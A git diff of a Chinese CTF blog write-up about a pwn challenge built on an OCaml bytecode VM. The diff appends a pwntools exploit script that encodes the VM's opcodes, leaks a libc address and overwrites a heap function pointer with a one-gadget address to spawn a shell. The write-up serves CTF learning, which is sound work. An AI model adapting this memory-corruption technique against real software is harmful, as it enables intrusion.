@@ -42,7 +42,7 @@ paginate: true
 ### 破局：CamlDumpObj
 这个时候，我以为题目的设计是，我的比如说两个字节对应一个常规虚拟机的指令，但是这个指令对应程序运行过程中不知道哪个内存地址的又一串序列指令，它在执行的时候执行内部写好的那一串指令这样的，但是怎么提取到这串指令就是一个问题，感觉调试的工作量多少有点太大了   
 不知道怎么做的时候就看了当时的 Discord 子区，发现当时 elsa 可以 dump 出来 OCaml bytecode，用类似于“caml dump bytecode from executable” 的关键字 google 了一下，看到了下面的回答：https://stackoverflow.com/questions/15183701/decompiling-ocaml-byte-code-files    
-而且当时 elsa学长 还在子区发了一份这样格式的文件：
+而且当时 elsa 学长 还在子区发了一份这样格式的文件：
 ![alt_text](/assets/img/uploads/bytecode.png)
 和那个 stack_overflow 上 dumpobj 的回答中的格式特别像是不是！    
 于是果断配了 OCaml 的环境，用 ocamldumpobj 直接对 app 跑了一下，果然得到了格式一样的文件，特别开心！
@@ -282,3 +282,73 @@ paginate: true
 还记得去年打题的时候，轩哥，雅儒学长，elsa 开了六个小时的腾讯会议连麦，当时有幸蹭了一波（甚至记得当时我在深圳的家里做题，穿了一件粉色的有小兔子的睡衣hhh），真的人生体验，看师傅们打题真的惊为天人，感觉自己在这么短的时间内应该是做不出来的ww，感觉大家好厉害ww，现在自己做的时候虽然比想象中简单，但是像是上面的综合能力，感觉自己还有挺大的提升空间    
 今年在北京造编译器和嗑盐的间隙摸鱼做题hhh，在下雨的晚上待在宿舍中厅，同时好队友 k4ra5u 在出题 http pwn，感觉好快乐好满足ww    
 最后如果有没讲细的地方请通过邮箱联系ww，联系方式在博客主页，谢谢大家阅读 ~
+
+## exp
+请忽略注释里面 rosa 的碎碎念（
+```py
+from pwn import *
+context(arch='amd64', os='linux', log_level='debug')
+p=process("./app")
+# todo figure out what does push_acc0,get_field const0 does, const0 看上去是1的样子
+def set_reg(i,val):
+    return b"\x00"+p8(i)+p8(val)
+def get_reg(i,j):
+    return b"\x01"+p8(i)+p8(j)
+def add(i,j):
+    return b"\x02"+p8(i)+p8(j)
+
+def add_and_set(i,j):
+    return b"\x03"+p8(i)+p8(j)
+
+def sub_and_set(i,j):
+    return b"\x05"+p8(i)+p8(j)
+def get_reg_mem(i,j): # 不知道 j 有啥用
+    return b"\x08"+p8(i)
+
+def get_mem(i,j):
+    return b"\x09"+p8(i)
+def load(i,j):
+    return b"\x0a"+p8(i)+p8(j) # 虽然但是感觉好像只和i有关系
+def dir_load(i,j):
+    return b"\x0b"+p8(i)+p8(j)
+def store(i,j):
+    return b"\x0c"+p8(i)+p8(j)
+def set_mem(i,j):
+    return b"\x0d"+p8(i)+p8(j)
+def set_mem_indir(i,j):
+    return b"\x0e"+p8(i)+p8(j)
+def syscall():
+    return b"\x0f\x00\x00"
+def mov(i,j):
+    return b"\x10"+p8(i)+p8(j)
+def set_mem4(i,j):
+    return b"\x11"+p8(i)+p8(j)
+def mul_and_set(i,j):
+    return b"\x07"+p8(i)+p8(j)
+def real_add(i,num,num2reg):
+    return set_reg(num2reg,num)+add(i,num2reg)+mul_and_set(0,15)+mov(num2reg,0)
+def real_sub(i,num,num2reg):
+    return set_reg(7,0x10)+set_reg(num2reg,num)+sub_and_set(i,num2reg)+mul_and_set(0,7)+mov(num2reg,0)
+# leak
+# oneshot: libstorage + 0x9fa0 (libc 和 libstorage 偏移固定的)
+# 思路：CALL_1 CALL_2 这些用的那个 prim_table 在堆上，所以可以靠改函数指针的方法
+# 先把 one_shot_addr*2+1 之类的东西放到一个寄存器里面，然后去把 (offset+1)*2 之类的存一个寄存器里面再调用 set_mem_indir 去写 syscall 指针
+# 0x564951ec0da0：一堆函数指针 0x0000564951ebefa0：我们溢出的buffer
+# gdb attach 上看偏移 reg0:0x7f933c3ee36a one_shot: 0x7f933c4f7fa0
+# 堆偏移 0x556209a26a58（syscall） 0x556209a23fa0
+#gdb.attach(p)
+heap_offset=0x557
+offset=0x109c34 # 16*0x109c3 不确定在 mov8 之后是不是真的 offset
+libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
+p.recvuntil(":\n")
+s=load(17,0)+set_reg(2,0x10)+mul_and_set(0,2)+get_reg(0,0)+mov(8,0)+set_reg(15,0x8) # 到这里的时候 reg0 是一个 libc 地址
+# 凑 0x109c3
+s+=set_reg(2,0x20)+set_reg(3,0xff)+set_reg(4,0xff)+mul_and_set(3,4)+mul_and_set(0,2)+mov(9,0)+set_reg(6,0x6f)+mul_and_set(6,3)+set_reg(7,0x48)+add_and_set(0,7)+add_and_set(0,9)+mul_and_set(0,15) # 下来是0x109dc 左右
+s+=set_reg(3,0x80)+mul_and_set(3,0) # 得到一个 0x109c40*2 之类的数
+s+=mov(4,0)+add_and_set(8,4)+mul_and_set(0,2)+mov(14,0)+get_reg(14,0)+real_sub(14,14,13) # 再调一下 感觉差不多是两倍 oneshot 的地址了，这个数//2再减7就是了 todo 改成28
+# 凑堆上偏移
+s+=set_reg(3,0xff)+set_reg(4,0x2a)+mul_and_set(3,4)+set_reg(5,0x48)+add_and_set(0,5)+get_reg(0,0) # 现在大概是 0x558 吧
+s+=mul_and_set(0,15)+set_mem_indir(0,13)+syscall()
+p.send(s)
+p.interactive()
+```
